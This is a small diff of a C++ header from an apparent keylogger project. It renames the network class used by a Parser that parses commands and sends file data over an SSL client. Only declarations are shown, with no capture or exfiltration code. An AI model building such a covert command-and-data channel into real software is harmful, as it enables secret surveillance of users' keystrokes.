@@ -4,12 +4,12 @@
 #include "Protocol.hpp"
 #include "KeyLoger.hpp"
 
-class SSLNetwork;
+class SSLTCPClient;
 
 class Parser
 {
 public:
-	Parser(SSLNetwork &);
+	Parser(SSLTCPClient &);
 	~Parser();
 	void parseCommands();
 	void closeCommand(t_cmd *);
@@ -20,7 +20,7 @@ public:
 	void displayCommandSendDataLoop(std::ifstream &file, t_cmd &tosend);
 
 private:
-	SSLNetwork &m_client;
+	SSLTCPClient &m_client;
 	char m_buffer[sizeof(t_cmd)];
 };
 
